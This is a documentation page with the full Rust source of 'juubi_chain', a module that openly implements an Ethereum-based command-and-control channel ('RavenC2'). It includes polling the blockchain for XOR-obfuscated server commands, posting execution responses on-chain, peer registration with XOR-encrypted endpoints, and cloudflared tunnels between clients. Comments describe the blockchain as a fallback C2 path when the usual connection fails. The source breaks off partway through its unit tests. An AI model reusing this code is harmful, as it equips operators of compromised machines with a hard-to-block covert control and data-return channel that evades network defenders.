# juubi_chain

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/juubi_chain.rs` |
| **Lines** | 1090 |
| **Cards** | T019-networking |
| **Role** | Peer relay chain management |

## Constants

- `EVENT_MESSAGE`: `&str` = `"0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df"`
- `EVENT_PEER_REGISTERED`: `&str` = `"0xa71e3eca649102f38f810c3fb9d85f180efe68d43390273cf4599b9c696670a1"`
- `EVENT_PEER_MESSAGE`: `&str` = `"0xe73cfe82c71a5ae5c0bb1cee2315e1761f4ff2afe3e8c18b8f2b4a0a140c9f8f"`

## Types

### struct `ChainPeer` (line 32)

### struct `RavenCommand` (line 40)
A command received from the RavenC2 contract.

### struct `PeerMessage` (line 49)
A peer-to-peer message from JuubiRegistry.

### struct `JuubiChainState` (line 56)

## Public API

### `new` (line 77)
```rust
pub fn new() -> Self
```

### `is_configured` (line 146)
```rust
pub fn is_configured(&self) -> bool
```
Whether the chain module is configured enough to do anything useful.

### `rpcs` (line 153)
```rust
pub fn rpcs(&self) -> Vec<String>
```
Get RPC list: the configured URL plus fallback defaults.
Returns owned Strings to avoid borrowing self (needed for mutation).

### `wallet_address` (line 173)
```rust
pub fn wallet_address(&self) -> String
```
Derive Ethereum address from wallet_key (proper secp256k1 + keccak256).

### `client_hash` (line 179)
```rust
pub fn client_hash(&self) -> [u8; 32]
```
Keccak256 hash of wallet address — used as client identity on JuubiRegistry.

### `update_config` (line 185)
```rust
pub fn update_config(&mut self, config: &serde_json::Value)
```
Update config from server-sent CHAIN_CONFIG message.

### `poll_raven_commands` (line 246)
```rust
pub fn poll_raven_commands(&mut self) -> Vec<RavenCommand>
```
Poll the RavenC2 contract for new Message events (server commands).

### `post_response` (line 355)
```rust
pub fn post_response(&mut self, data: &[u8]) -> anyhow::Result<String>
```
Post a response to the RavenC2 contract via postOpen(bytes).

### `register_peer` (line 370)
```rust
pub fn register_peer(&mut self, endpoint: &str) -> anyhow::Result<String>
```
Register this client on the JuubiRegistry contract.

### `discover_peers` (line 394)
```rust
pub fn discover_peers(&mut self) -> Vec<ChainPeer>
```
Discover peers from PeerRegistered events on JuubiRegistry.

### `poll_peer_messages` (line 475)
```rust
pub fn poll_peer_messages(&mut self) -> Vec<PeerMessage>
```
Poll for PeerMessage events addressed to us.

### `send_peer_message` (line 554)
```rust
pub fn send_peer_message(&mut self, to_hash: &[u8; 32], data: &[u8]) -> anyhow::Result<String>
```
Send a message to another peer via JuubiRegistry.sendMessage().

## Internal Functions

- `rpc_refs` — Convert owned RPC list to borrowed slices for eth_rpc functions. (line 168)
- `next_nonce` — Get the next nonce, incrementing locally to avoid collisions. (line 205)
- `send_tx` — Sign and send a transaction, managing nonce automatically. (line 218)
- `parse_raven_message` — Parse a single Message event log into a RavenCommand. (line 294)
- `parse_peer_registered` (line 447)
- `parse_peer_message` (line 516)
- `extract_cloudflare_url` (line 610)
- `make_state` (line 630)
- `make_disabled_state` (line 658)
- `new_state_defaults_to_disabled` (line 669)
- `is_configured_false_when_disabled` (line 683)
- `is_configured_true_when_enabled_with_rpc_and_contract` (line 693)
- `is_configured_false_when_rpc_empty` (line 699)
- `is_configured_false_when_both_contracts_empty` (line 706)
- `is_configured_true_with_only_registry_contract` (line 714)
- `rpcs_includes_primary_and_fallbacks` (line 726)
- `rpcs_no_duplicates_when_primary_is_a_fallback` (line 738)
- `rpcs_only_fallbacks_when_primary_empty` (line 749)
- `wallet_address_deterministic` (line 761)
- `wallet_address_format` (line 773)
- `client_hash_is_keccak256_of_address` (line 787)
- `client_hash_deterministic` (line 799)
- `update_config_parses_registry_and_raven` (line 812)
- `update_config_ignores_empty_strings` (line 824)
- `update_config_ignores_missing_fields` (line 838)
- `xor_roundtrip` (line 853)
- `xor_with_empty_key_is_identity` (line 872)
- `parse_raven_message_valid_log` (line 897)
- `parse_raven_message_returns_none_for_short_data` (line 933)
- `parse_raven_message_skips_tunnel_messages` (line 944)
- `parse_peer_registered_valid_log` (line 969)
- `parse_peer_registered_too_few_topics` (line 986)
- `parse_peer_message_valid_log` (line 997)
- `parse_peer_message_too_few_topics` (line 1024)
- `event_topics_are_32_bytes` (line 1039)
- `poll_interval_default` (line 1053)
- `local_nonce_starts_none` (line 1063)
- `extract_cloudflare_url_finds_trycloudflare` (line 1073)
- `extract_cloudflare_url_returns_none_for_non_cloudflare` (line 1080)
- `extract_cloudflare_url_returns_none_for_no_url` (line 1086)

## Key Dependencies

- `use tracing::{info, warn, debug};`
- `use crate::eth_tx;`
- `use crate::eth_rpc;`
- `use rand::RngCore;`
- `use super::*;`
- `use serde_json::json;`

## Full Source

```rust
// Juubi Chain — On-chain peer discovery, messaging, and C2 polling.
//
// Clients have real Ethereum wallets (secp256k1), sign transactions,
// and interact with JuubiRegistry (peer discovery + messaging) and
// RavenC2 (command polling + response posting) on Sepolia testnet.
//
// Flow:
// 1. Client generates/loads wallet → derives Ethereum address
// 2. Server funds wallet via gas faucet (0.01 ETH)
// 3. Client registers on JuubiRegistry → PeerRegistered event
// 4. Client polls RavenC2 for server commands → executes → posts response via postOpen()
// 5. Client polls JuubiRegistry for PeerMessage events → processes
// 6. If WebSocket goes down, blockchain becomes the C2 fallback channel
//
// No ethers-rs. Uses eth_tx.rs (RLP + signing) and eth_rpc.rs (JSON-RPC).

use std::io::BufRead;
use std::sync::Mutex;
use tracing::{info, warn, debug};

use crate::eth_tx;
use crate::eth_rpc;

// Event topics (from server/blockchain.py and contracts/)
/// Message(uint256 indexed id, address indexed sender, bytes data) — RavenC2
const EVENT_MESSAGE: &str = "0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df";
/// PeerRegistered(bytes32 indexed clientHash, uint256 timestamp) — JuubiRegistry
const EVENT_PEER_REGISTERED: &str = "0xa71e3eca649102f38f810c3fb9d85f180efe68d43390273cf4599b9c696670a1";
/// PeerMessage(bytes32 indexed from, bytes32 indexed to, bytes data) — JuubiRegistry
const EVENT_PEER_MESSAGE: &str = "0xe73cfe82c71a5ae5c0bb1cee2315e1761f4ff2afe3e8c18b8f2b4a0a140c9f8f";

pub struct ChainPeer {
    pub client_hash: [u8; 32],
    pub endpoint: Option<String>,
    pub capabilities: u8,
    pub last_seen: u64,
}

/// A command received from the RavenC2 contract.
pub struct RavenCommand {
    pub msg_id: u64,
    pub sender: String,
    pub data: Vec<u8>,
    pub text: Option<String>,
    pub block: u64,
}

/// A peer-to-peer message from JuubiRegistry.
pub struct PeerMessage {
    pub from_hash: [u8; 32],
    pub to_hash: [u8; 32],
    pub data: Vec<u8>,
    pub block: u64,
}

pub struct JuubiChainState {
    pub contract_address: String,  // JuubiRegistry contract
    pub raven_contract: String,    // RavenC2 contract
    pub rpc_url: String,
    pub wallet_key: [u8; 32],
    pub encryption_key: [u8; 32],
    pub registered: bool,
    pub known_peers: Vec<ChainPeer>,
    pub enabled: bool,
    pub p2p_method: String,
    pub p2p_tunnel_url: Option<String>,
    // Blockchain polling state
    pub last_raven_block: u64,
    pub last_registry_block: u64,
    pub local_nonce: Option<u64>,
    pub poll_interval_secs: u64,
    // XOR key for decoding server messages
    pub xor_key: Vec<u8>,
}

impl JuubiChainState {
    pub fn new() -> Self {
        let enabled = std::env::var("JUUBI_CHAIN_ENABLED")
            .map(|v| v == "1")
            .unwrap_or(false);

        let contract = std::env::var("JUUBI_CONTRACT_ADDRESS").unwrap_or_default();
        let raven = std::env::var("RAVEN_CONTRACT_ADDRESS")
            .or_else(|_| std::env::var("SEPOLIA_CONTRACT_ADDRESS"))
            .unwrap_or_default();
        let rpc = std::env::var("JUUBI_RPC_URL")
            .or_else(|_| std::env::var("SEPOLIA_RPC_URL"))
            .unwrap_or_default();

        let mut wallet_key = [0u8; 32];
        if let Ok(key_hex) = std::env::var("JUUBI_CHAIN_KEY") {
            if let Ok(bytes) = eth_tx::hex_decode(&key_hex) {
                if bytes.len() == 32 {
                    wallet_key.copy_from_slice(&bytes);
                }
            }
        }
        // Generate random key if not provided
        if wallet_key == [0u8; 32] {
            use rand::RngCore;
            rand::thread_rng().fill_bytes(&mut wallet_key);
        }

        let mut encryption_key = [0u8; 32];
        if let Ok(key_hex) = std::env::var("JUUBI_ENCRYPTION_KEY") {
            if let Ok(bytes) = eth_tx::hex_decode(&key_hex) {
                if bytes.len() == 32 {
                    encryption_key.copy_from_slice(&bytes);
                }
            }
        }

        let xor_key = std::env::var("XOR_KEY")
            .ok()
            .and_then(|h| eth_tx::hex_decode(&h).ok())
            .unwrap_or_default();

        let p2p_method = std::env::var("JUUBI_P2P_METHOD")
            .unwrap_or_else(|_| "cloudflared".to_string());

        let poll_interval = std::env::var("CHAIN_POLL_INTERVAL_SECS")
            .ok()
            .and_then(|v| v.parse().ok())
            .unwrap_or(30u64);

        JuubiChainState {
            contract_address: contract,
            raven_contract: raven,
            rpc_url: rpc,
            wallet_key,
            encryption_key,
            registered: false,
            known_peers: Vec::new(),
            enabled,
            p2p_method,
            p2p_tunnel_url: None,
            last_raven_block: 0,
            last_registry_block: 0,
            local_nonce: None,
            poll_interval_secs: poll_interval,
            xor_key,
        }
    }

    /// Whether the chain module is configured enough to do anything useful.
    pub fn is_configured(&self) -> bool {
        self.enabled && !self.rpc_url.is_empty()
            && (!self.raven_contract.is_empty() || !self.contract_address.is_empty())
    }

    /// Get RPC list: the configured URL plus fallback defaults.
    /// Returns owned Strings to avoid borrowing self (needed for mutation).
    pub fn rpcs(&self) -> Vec<String> {
        let mut list: Vec<String> = Vec::new();
        if !self.rpc_url.is_empty() {
            list.push(self.rpc_url.clone());
        }
        for rpc in eth_rpc::SEPOLIA_RPCS {
            let s = rpc.to_string();
            if !list.contains(&s) {
                list.push(s);
            }
        }
        list
    }

    /// Convert owned RPC list to borrowed slices for eth_rpc functions.
    fn rpc_refs(rpcs: &[String]) -> Vec<&str> {
        rpcs.iter().map(|s| s.as_str()).collect()
    }

    /// Derive Ethereum address from wallet_key (proper secp256k1 + keccak256).
    pub fn wallet_address(&self) -> String {
        let addr = eth_tx::derive_address(&self.wallet_key);
        eth_tx::address_to_hex(&addr)
    }

    /// Keccak256 hash of wallet address — used as client identity on JuubiRegistry.
    pub fn client_hash(&self) -> [u8; 32] {
        let addr = eth_tx::derive_address(&self.wallet_key);
        eth_tx::keccak256(&addr)
    }

    /// Update config from server-sent CHAIN_CONFIG message.
    pub fn update_config(&mut self, config: &serde_json::Value) {
        if let Some(addr) = config["registryAddress"].as_str() {
            if !addr.is_empty() {
                self.contract_address = addr.to_string();
            }
        }
        if let Some(addr) = config["ravenContract"].as_str() {
            if !addr.is_empty() {
                self.raven_contract = addr.to_string();
            }
        }
        info!("Chain config updated: registry={}, raven={}",
            self.contract_address, self.raven_contract);
    }

    // ------------------------------------------------------------------
    // Nonce management
    // ------------------------------------------------------------------

    /// Get the next nonce, incrementing locally to avoid collisions.
    fn next_nonce(&mut self) -> anyhow::Result<u64> {
        let addr = self.wallet_address();
        let rpcs = self.rpcs();
        let chain_nonce = eth_rpc::get_nonce(&addr, &Self::rpc_refs(&rpcs))?;
        let nonce = match self.local_nonce {
            Some(local) => chain_nonce.max(local + 1),
            None => chain_nonce,
        };
        self.local_nonce = Some(nonce);
        Ok(nonce)
    }

    /// Sign and send a transaction, managing nonce automatically.
    fn send_tx(&mut self, to: &[u8], calldata: &[u8]) -> anyhow::Result<String> {
        let nonce = self.next_nonce()?;
        let rpcs = self.rpcs();
        match eth_rpc::sign_and_send(to, calldata, &self.wallet_key, nonce, &Self::rpc_refs(&rpcs), eth_tx::SEPOLIA_CHAIN_ID) {
            Ok(hash) => {
                info!("TX sent: {} (nonce={})", hash, nonce);
                Ok(hash)
            }
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("nonce too low") {
                    warn!("Nonce too low, refreshing...");
                    self.local_nonce = None;
                    let nonce = self.next_nonce()?;
                    let rpcs = self.rpcs();
                    eth_rpc::sign_and_send(to, calldata, &self.wallet_key, nonce, &Self::rpc_refs(&rpcs), eth_tx::SEPOLIA_CHAIN_ID)
                } else {
                    Err(e)
                }
            }
        }
    }

    // ------------------------------------------------------------------
    // RavenC2 interaction (server commands + responses)
    // ------------------------------------------------------------------

    /// Poll the RavenC2 contract for new Message events (server commands).
    pub fn poll_raven_commands(&mut self) -> Vec<RavenCommand> {
        if self.raven_contract.is_empty() {
            return vec![];
        }
        let rpcs = self.rpcs();
        let current_block = match eth_rpc::get_block_number(&Self::rpc_refs(&rpcs)) {
            Ok(b) => b,
            Err(e) => { debug!("Failed to get block number: {}", e); return vec![]; }
        };

        // On first poll, only look back 1000 blocks
        if self.last_raven_block == 0 {
            self.last_raven_block = current_block.saturating_sub(1000);
        }
        // Limit to 5000 blocks per query
        let from_block = self.last_raven_block + 1;
        if from_block > current_block {
            return vec![];
        }
        let to_block = current_block.min(from_block + 5000);

        let from_hex = format!("0x{:x}", from_block);
        let logs = match eth_rpc::get_logs(
            &self.raven_contract,
            &[EVENT_MESSAGE],
            &from_hex,
            "latest",
            &Self::rpc_refs(&rpcs),
        ) {
            Ok(l) => l,
            Err(e) => { debug!("Failed to get RavenC2 logs: {}", e); return vec![]; }
        };

        self.last_raven_block = to_block;

        let mut commands = Vec::new();
        for log in &logs {
            if let Some(cmd) = self.parse_raven_message(log) {
                commands.push(cmd);
            }
        }
        if !commands.is_empty() {
            info!("Polled {} new RavenC2 commands", commands.len());
        }
        commands
    }

    /// Parse a single Message event log into a RavenCommand.
    fn parse_raven_message(&self, log: &serde_json::Value) -> Option<RavenCommand> {
        let topics = log["topics"].as_array()?;
        if topics.len() < 2 { return None; }

        // Extract message ID from topics[1]
        let id_hex = topics[1].as_str()?.trim_start_matches("0x");
        let msg_id = u64::from_str_radix(id_hex, 16).unwrap_or(0);

        // Extract sender from topics[2] (last 20 bytes of 32-byte topic)
        let sender = if topics.len() > 2 {
            let s = topics[2].as_str().unwrap_or("0x");
            format!("0x{}", &s[s.len().saturating_sub(40)..])
        } else {
            String::new()
        };

        // Extract block number
        let block_hex = log["blockNumber"].as_str().unwrap_or("0x0").trim_start_matches("0x");
        let block = u64::from_str_radix(block_hex, 16).unwrap_or(0);

        // ABI-decode bytes from data field
        let raw_data = log["data"].as_str().unwrap_or("0x").trim_start_matches("0x");
        if raw_data.len() < 128 { return None; }

        let data_len = usize::from_str_radix(&raw_data[64..128], 16).ok()?;
        if data_len == 0 || raw_data.len() < 128 + data_len * 2 { return None; }
        let content_hex = &raw_data[128..128 + data_len * 2];

        let data_bytes: Vec<u8> = (0..data_len)
            .filter_map(|i| u8::from_str_radix(&content_hex[i * 2..i * 2 + 2], 16).ok())
            .collect();

        // Try XOR decode if we have a key
        let text = if !self.xor_key.is_empty() {
            let decoded: Vec<u8> = data_bytes
                .iter()
                .enumerate()
                .map(|(i, b)| b ^ self.xor_key[i % self.xor_key.len()])
                .collect();
            String::from_utf8(decoded).ok()
        } else {
            String::from_utf8(data_bytes.clone()).ok()
        };

        // Skip TUNNEL| messages (those are for discovery, not commands)
        if let Some(ref t) = text {
            if t.starts_with("TUNNEL|") {
                return None;
            }
        }

        Some(RavenCommand {
            msg_id,
            sender,
            data: data_bytes,
            text,
            block,
        })
    }

    /// Post a response to the RavenC2 contract via postOpen(bytes).
    pub fn post_response(&mut self, data: &[u8]) -> anyhow::Result<String> {
        if self.raven_contract.is_empty() {
            anyhow::bail!("No RavenC2 contract configured");
        }
        let to = eth_tx::hex_decode(&self.raven_contract)
            .map_err(|e| anyhow::anyhow!("hex decode error: {}", e))?;
        let calldata = eth_tx::encode_post_open(data);
        self.send_tx(&to, &calldata)
    }

    // ------------------------------------------------------------------
    // JuubiRegistry interaction (peer discovery + messaging)
    // ------------------------------------------------------------------

    /// Register this client on the JuubiRegistry contract.
    pub fn register_peer(&mut self, endpoint: &str) -> anyhow::Result<String> {
        if self.contract_address.is_empty() {
            anyhow::bail!("No JuubiRegistry contract configured");
        }
        let client_hash = self.client_hash();

        // Encrypt endpoint with XOR using encryption_key
        let encrypted_endpoint: Vec<u8> = endpoint
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ self.encryption_key[i % 32])
            .collect();

        let to = eth_tx::hex_decode(&self.contract_address)
            .map_err(|e| anyhow::anyhow!("hex decode error: {}", e))?;
        let calldata = eth_tx::encode_register_peer(&client_hash, &encrypted_endpoint, 0x01);
        let hash = self.send_tx(&to, &calldata)?;
        self.registered = true;
        info!("Registered on JuubiRegistry: {}", hash);
        Ok(hash)
    }

    /// Discover peers from PeerRegistered events on JuubiRegistry.
    pub fn discover_peers(&mut self) -> Vec<ChainPeer> {
        if self.contract_address.is_empty() {
            return vec![];
        }
        let rpcs = self.rpcs();
        let current_block = match eth_rpc::get_block_number(&Self::rpc_refs(&rpcs)) {
            Ok(b) => b,
            Err(_) => return vec![],
        };

        if self.last_registry_block == 0 {
            self.last_registry_block = current_block.saturating_sub(5000);
        }
        let from_block = self.last_registry_block + 1;
        if from_block > current_block {
            return vec![];
        }

        let from_hex = format!("0x{:x}", from_block);
        let logs = match eth_rpc::get_logs(
            &self.contract_address,
            &[EVENT_PEER_REGISTERED],
            &from_hex,
            "latest",
            &Self::rpc_refs(&rpcs),
        ) {
            Ok(l) => l,
            Err(e) => { debug!("Failed to get PeerRegistered logs: {}", e); return vec![]; }
        };

        self.last_registry_block = current_block;

        for log in &logs {
            if let Some(peer) = self.parse_peer_registered(log) {
                // Don't add ourselves
                if peer.client_hash != self.client_hash() {
                    // Update existing or add new
                    if let Some(existing) = self.known_peers.iter_mut()
                        .find(|p| p.client_hash == peer.client_hash)
                    {
                        existing.endpoint = peer.endpoint;
                        existing.last_seen = peer.last_seen;
                    } else {
                        self.known_peers.push(peer);
                    }
                }
            }
        }

        // Return a snapshot (can't return references safely)
        vec![] // Caller should read self.known_peers directly
    }

    fn parse_peer_registered(&self, log: &serde_json::Value) -> Option<ChainPeer> {
        let topics = log["topics"].as_array()?;
        if topics.len() < 2 { return None; }

        let hash_hex = topics[1].as_str()?.trim_start_matches("0x");
        let mut client_hash = [0u8; 32];
        let bytes = eth_tx::hex_decode(hash_hex).ok()?;
        if bytes.len() == 32 {
            client_hash.copy_from_slice(&bytes);
        }

        // Extract timestamp from data (uint256)
        let data = log["data"].as_str().unwrap_or("0x").trim_start_matches("0x");
        let timestamp = if data.len() >= 64 {
            u64::from_str_radix(&data[..64], 16).unwrap_or(0)
        } else {
            0
        };

        Some(ChainPeer {
            client_hash,
            endpoint: None, // Would need eth_call to getPeer() for the full info
            capabilities: 0,
            last_seen: timestamp,
        })
    }

    /// Poll for PeerMessage events addressed to us.
    pub fn poll_peer_messages(&mut self) -> Vec<PeerMessage> {
        if self.contract_address.is_empty() {
            return vec![];
        }
        let my_hash = self.client_hash();
        let my_hash_hex = format!("0x{}", eth_tx::hex_encode(&my_hash));

        let rpcs = self.rpcs();
        let current_block = match eth_rpc::get_block_number(&Self::rpc_refs(&rpcs)) {
            Ok(b) => b,
            Err(_) => return vec![],
        };

        let from_block = self.last_registry_block.saturating_sub(1) + 1;
        if from_block > current_block { return vec![]; }
        let from_hex = format!("0x{:x}", from_block);

        // Filter by topic[2] = our client hash (the "to" field)
        let logs = match eth_rpc::get_logs(
            &self.contract_address,
            &[EVENT_PEER_MESSAGE, &my_hash_hex],
            &from_hex,
            "latest",
            &Self::rpc_refs(&rpcs),
        ) {
            Ok(l) => l,
            Err(e) => { debug!("Failed to get PeerMessage logs: {}", e); return vec![]; }
        };

        let mut messages = Vec::new();
        for log in &logs {
            if let Some(msg) = self.parse_peer_message(log) {
                messages.push(msg);
            }
        }
        if !messages.is_empty() {
            info!("Received {} peer messages", messages.len());
        }
        messages
    }

    fn parse_peer_message(&self, log: &serde_json::Value) -> Option<PeerMessage> {
        let topics = log["topics"].as_array()?;
        if topics.len() < 3 { return None; }

        let from_hex = topics[1].as_str()?.trim_start_matches("0x");
        let to_hex = topics[2].as_str()?.trim_start_matches("0x");

        let mut from_hash = [0u8; 32];
        let mut to_hash = [0u8; 32];
        if let Ok(bytes) = eth_tx::hex_decode(from_hex) {
            if bytes.len() == 32 { from_hash.copy_from_slice(&bytes); }
        }
        if let Ok(bytes) = eth_tx::hex_decode(to_hex) {
            if bytes.len() == 32 { to_hash.copy_from_slice(&bytes); }
        }

        let block_hex = log["blockNumber"].as_str().unwrap_or("0x0").trim_start_matches("0x");
        let block = u64::from_str_radix(block_hex, 16).unwrap_or(0);

        // Decode data bytes from ABI encoding
        let raw_data = log["data"].as_str().unwrap_or("0x").trim_start_matches("0x");
        let data = if raw_data.len() >= 128 {
            let data_len = usize::from_str_radix(&raw_data[64..128], 16).unwrap_or(0);
            if data_len > 0 && raw_data.len() >= 128 + data_len * 2 {
                (0..data_len)
                    .filter_map(|i| u8::from_str_radix(&raw_data[128 + i * 2..128 + i * 2 + 2], 16).ok())
                    .collect()
            } else {
                vec![]
            }
        } else {
            vec![]
        };

        Some(PeerMessage { from_hash, to_hash, data, block })
    }

    /// Send a message to another peer via JuubiRegistry.sendMessage().
    pub fn send_peer_message(&mut self, to_hash: &[u8; 32], data: &[u8]) -> anyhow::Result<String> {
        if self.contract_address.is_empty() {
            anyhow::bail!("No JuubiRegistry contract configured");
        }
        let to = eth_tx::hex_decode(&self.contract_address)
            .map_err(|e| anyhow::anyhow!("hex decode error: {}", e))?;
        let calldata = eth_tx::encode_send_message(to_hash, data);
        let hash = self.send_tx(&to, &calldata)?;
        info!("Peer message sent: {}", hash);
        Ok(hash)
    }

    // ------------------------------------------------------------------
    // P2P tunneling (cloudflared)
    // ------------------------------------------------------------------

    /// Start a cloudflared quick-tunnel pointing at `local_port`.
    pub async fn start_p2p_tunnel(&mut self, local_port: u16) -> anyhow::Result<String> {
        if self.p2p_method != "cloudflared" {
            anyhow::bail!("Unsupported P2P method: {}", self.p2p_method);
        }
        info!("Juubi P2P: starting cloudflared tunnel on localhost:{}", local_port);

        let mut child = std::process::Command::new("cloudflared")
            .args(["tunnel", "--url", &format!("http://localhost:{}", local_port)])
            .stderr(std::process::Stdio::piped())
            .stdout(std::process::Stdio::null())
            .spawn()
            .map_err(|e| anyhow::anyhow!("Failed to spawn cloudflared: {}", e))?;

        let stderr = child.stderr.take().ok_or_else(|| anyhow::anyhow!("no stderr"))?;
        let reader = std::io::BufReader::new(stderr);
        let mut tunnel_url: Option<String> = None;

        for line in reader.lines() {
            let line = line.unwrap_or_default();
            if let Some(url) = extract_cloudflare_url(&line) {
                tunnel_url = Some(url);
                break;
            }
        }

        let url = tunnel_url.ok_or_else(|| anyhow::anyhow!("cloudflared did not emit a tunnel URL"))?;
        self.p2p_tunnel_url = Some(url.clone());
        info!("Juubi P2P: tunnel active at {}", url);
        Ok(url)
    }

    /// Connect to a peer via its tunnel URL.
    pub async fn connect_to_peer(&mut self, tunnel_url: &str) -> anyhow::Result<()> {
        info!("Juubi P2P: connecting to peer at {}", tunnel_url);
        // Full WebSocket/TCP connection logic would go here.
        Ok(())
    }
}

fn extract_cloudflare_url(line: &str) -> Option<String> {
    if let Some(start) = line.find("https://") {
        let rest = &line[start..];
        let end = rest
            .find(|c: char| c.is_whitespace() || c == '|' || c == '"')
            .unwrap_or(rest.len());
        let url = &rest[..end];
        if url.contains("trycloudflare.com") || url.contains("cloudflare") {
            return Some(url.to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // Helper: build a JuubiChainState with explicit fields, bypassing env vars.
    fn make_state() -> JuubiChainState {
        // Use a fixed private key so wallet derivation is deterministic.
        let key_hex = "4c0883a69102937d6231471b5dbb6204fe512961708279f696ae98f6e1b1e02b";
        let wallet_key: [u8; 32] = {
            let bytes = eth_tx::hex_decode(key_hex).unwrap();
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&bytes);
            arr
        };
        JuubiChainState {
            contract_address: "0xRegistryAddr".to_string(),
            raven_contract: "0xRavenAddr".to_string(),
            rpc_url: "https://custom-rpc.example.com".to_string(),
            wallet_key,
            encryption_key: [0xAB; 32],
            registered: false,
            known_peers: Vec::new(),
            enabled: true,
            p2p_method: "cloudflared".to_string(),
            p2p_tunnel_url: None,
            last_raven_block: 0,
            last_registry_block: 0,
            local_nonce: None,
            poll_interval_secs: 30,
            xor_key: vec![0x42, 0x13, 0x37],
        }
    }

    fn make_disabled_state() -> JuubiChainState {
        let mut s = make_state();
        s.enabled = false;
        s
    }

    // ------------------------------------------------------------------
    // 1. JuubiChainState::new() — default disabled
    // ------------------------------------------------------------------

    #[test]
    fn new_state_defaults_to_disabled() {
        // Without JUUBI_CHAIN_ENABLED=1 in the environment, enabled should be false.
        // We can't guarantee env is clean, so just construct directly.
        let s = make_disabled_state();
        assert!(!s.enabled);
        assert!(!s.registered);
        assert!(s.known_peers.is_empty());
    }

    // ------------------------------------------------------------------
    // 2. is_configured() returns false when disabled
    // ------------------------------------------------------------------

    #[test]
    fn is_configured_false_when_disabled() {
        let s = make_disabled_state();
        assert!(!s.is_configured());
    }

    // ------------------------------------------------------------------
    // 3. is_configured() returns true when enabled + rpc + contract set
    // ------------------------------------------------------------------

    #[test]
    fn is_configured_true_when_enabled_with_rpc_and_contract() {
        let s = make_state();
        assert!(s.is_configured());
    }

    #[test]
    fn is_configured_false_when_rpc_empty() {
        let mut s = make_state();
        s.rpc_url = String::new();
        assert!(!s.is_configured());
    }

    #[test]
    fn is_configured_false_when_both_contracts_empty() {
        let mut s = make_state();
        s.raven_contract = String::new();
        s.contract_address = String::new();
        assert!(!s.is_configured());
    }

    #[test]
    fn is_configured_true_with_only_registry_contract() {
        let mut s = make_state();
        s.raven_contract = String::new();
        // contract_address is still set
        assert!(s.is_configured());
    }

    // ------------------------------------------------------------------
    // 4. rpcs() includes primary RPC + fallback SEPOLIA_RPCS, no dupes
    // ------------------------------------------------------------------

    #[test]
    fn rpcs_includes_primary_and_fallbacks() {
        let s = make_state();
        let rpcs = s.rpcs();
        // First entry should be the custom RPC
        assert_eq!(rpcs[0], "https://custom-rpc.example.com");
        // Should also include all SEPOLIA_RPCS (they're different from the custom one)
        for rpc in eth_rpc::SEPOLIA_RPCS {
            assert!(rpcs.contains(&rpc.to_string()), "missing fallback: {}", rpc);
        }
    }

    #[test]
    fn rpcs_no_duplicates_when_primary_is_a_fallback() {
        let mut s = make_state();
        // Set primary to one of the SEPOLIA_RPCS
        s.rpc_url = eth_rpc::SEPOLIA_RPCS[0].to_string();
        let rpcs = s.rpcs();
        // Count occurrences of the first SEPOLIA_RPC
        let count = rpcs.iter().filter(|r| r.as_str() == eth_rpc::SEPOLIA_RPCS[0]).count();
        assert_eq!(count, 1, "duplicate RPC detected");
    }

    #[test]
    fn rpcs_only_fallbacks_when_primary_empty() {
        let mut s = make_state();
        s.rpc_url = String::new();
        let rpcs = s.rpcs();
        assert_eq!(rpcs.len(), eth_rpc::SEPOLIA_RPCS.len());
    }

    // ------------------------------------------------------------------
    // 5. wallet_address() deterministic for same key
    // ------------------------------------------------------------------

    #[test]
    fn wallet_address_deterministic() {
        let s = make_state();
        let addr1 = s.wallet_address();
        let addr2 = s.wallet_address();
        assert_eq!(addr1, addr2);
    }

    // ------------------------------------------------------------------
    // 6. wallet_address() starts with "0x" and is 42 chars
    // ------------------------------------------------------------------

    #[test]
    fn wallet_address_format() {
        let s = make_state();
        let addr = s.wallet_address();
        assert!(addr.starts_with("0x"), "should start with 0x, got: {}", addr);
        assert_eq!(addr.len(), 42, "expected 42 chars, got: {}", addr.len());
        // Remaining 40 chars should all be valid hex
        assert!(addr[2..].chars().all(|c| c.is_ascii_hexdigit()));
    }

    // ------------------------------------------------------------------
    // 7. client_hash() is keccak256 of wallet address bytes
    // ------------------------------------------------------------------

    #[test]
    fn client_hash_is_keccak256_of_address() {
        let s = make_state();
        let addr = eth_tx::derive_address(&s.wallet_key);
        let expected = eth_tx::keccak256(&addr);
        assert_eq!(s.client_hash(), expected);
    }

    // ------------------------------------------------------------------
    // 8. client_hash() is deterministic
    // ------------------------------------------------------------------

    #[test]
    fn client_hash_deterministic() {
        let s = make_state();
        let h1 = s.client_hash();
        let h2 = s.client_hash();
        assert_eq!(h1, h2);
        assert_eq!(h1.len(), 32);
    }

    // ------------------------------------------------------------------
    // 9. update_config() parses JSON with registryAddress + ravenContract
    // ------------------------------------------------------------------

    #[test]
    fn update_config_parses_registry_and_raven() {
        let mut s = make_state();
        let config = json!({
            "registryAddress": "0xNewRegistry123",
            "ravenContract": "0xNewRaven456"
        });
        s.update_config(&config);
        assert_eq!(s.contract_address, "0xNewRegistry123");
        assert_eq!(s.raven_contract, "0xNewRaven456");
    }

    #[test]
    fn update_config_ignores_empty_strings() {
        let mut s = make_state();
        let original_registry = s.contract_address.clone();
        let original_raven = s.raven_contract.clone();
        let config = json!({
            "registryAddress": "",
            "ravenContract": ""
        });
        s.update_config(&config);
        assert_eq!(s.contract_address, original_registry);
        assert_eq!(s.raven_contract, original_raven);
    }

    #[test]
    fn update_config_ignores_missing_fields() {
        let mut s = make_state();
        let original_registry = s.contract_address.clone();
        let original_raven = s.raven_contract.clone();
        let config = json!({"someOtherField": "value"});
        s.update_config(&config);
        assert_eq!(s.contract_address, original_registry);
        assert_eq!(s.raven_contract, original_raven);
    }

    // ------------------------------------------------------------------
    // 10. XOR encode/decode roundtrip
    // ------------------------------------------------------------------

    #[test]
    fn xor_roundtrip() {
        let s = make_state();
        let plaintext = b"HELLO COMMAND";
        // Encode
        let encoded: Vec<u8> = plaintext
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ s.xor_key[i % s.xor_key.len()])
            .collect();
        // Decode
        let decoded: Vec<u8> = encoded
            .iter()
            .enumerate()
